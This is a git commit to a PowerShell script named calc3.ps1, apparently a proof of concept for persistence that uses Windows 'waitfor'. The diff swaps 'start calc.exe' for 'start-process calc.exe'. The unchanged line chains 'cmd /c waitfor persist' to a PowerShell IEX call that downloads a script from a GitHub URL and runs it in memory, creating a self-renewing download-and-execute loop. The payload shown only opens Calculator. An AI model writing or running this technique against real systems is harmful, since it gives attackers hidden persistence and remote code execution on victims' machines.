67280c36be5ede5028c70ccfc147e8c20670a306
3gstudent <robertpetersen@outlook.com>
2017-06-06 19:29:04 -0700

    Update calc3.ps1

--- calc3.ps1
+++ calc3.ps1
@@ -1,2 +1,2 @@
-start calc.exe
+start-process calc.exe
 cmd /c waitfor persist `&`& powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc3.ps1')
